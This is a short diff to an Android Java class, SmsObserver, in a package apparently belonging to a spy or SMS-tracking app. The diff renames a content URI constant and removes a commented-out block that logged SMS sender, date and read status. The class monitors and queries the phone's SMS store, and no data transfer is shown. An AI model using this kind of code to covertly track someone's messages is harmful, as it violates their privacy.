@@ -14,7 +14,7 @@ import edu.uj.jkordas.spy.developer.Logger;
 public class SmsObserver extends ContentObserver {
 
     private static final String TAG = "SMSTRACKER";
-    private static final Uri STATUS_URI = Uri.parse("content://sms");
+    private static final Uri SMS_URI = Uri.parse("content://sms");
 
     private Context context;
     private Handler handler;
@@ -38,7 +38,7 @@ public class SmsObserver extends ContentObserver {
 
         try {
             Log.d(TAG, "Notification on SMS observer");
-            Cursor sms_sent_cursor = context.getContentResolver().query(STATUS_URI, null, null,
+            Cursor sms_sent_cursor = context.getContentResolver().query(SMS_URI, null, null,
                     null, null);
             if (sms_sent_cursor != null) {
                 if (sms_sent_cursor.moveToFirst()) {
@@ -46,20 +46,7 @@ public class SmsObserver extends ContentObserver {
                             .getColumnIndex("protocol"));
                     Log.d(TAG, "protocol : " + protocol);
                     if (protocol == null) {
-                        /*
-						 * sms_sent_cursor.getString(sms_sent_cursor
-						 * .getColumnIndex("address"))); Log.d(TAG, "Person : "
-						 * + sms_sent_cursor.getString(sms_sent_cursor
-						 * .getColumnIndex("person"))); Log.d(TAG, "Date : " +
-						 * sms_sent_cursor.getLong(sms_sent_cursor
-						 * .getColumnIndex("date"))); Log.d(TAG, "Read : " +
-						 * sms_sent_cursor.getString(sms_sent_cursor
-						 * .getColumnIndex("read"))); Log.d(TAG, "Status : " +
-						 * sms_sent_cursor.getString(sms_sent_cursor
-						 */
-                        Uri uriSMSURI = Uri.parse("content://sms");
-
-                        Cursor cur = context.getContentResolver().query(uriSMSURI, null, null,
+                        Cursor cur = context.getContentResolver().query(SMS_URI, null, null,
                                 null, null);
                         cur.moveToNext();
 
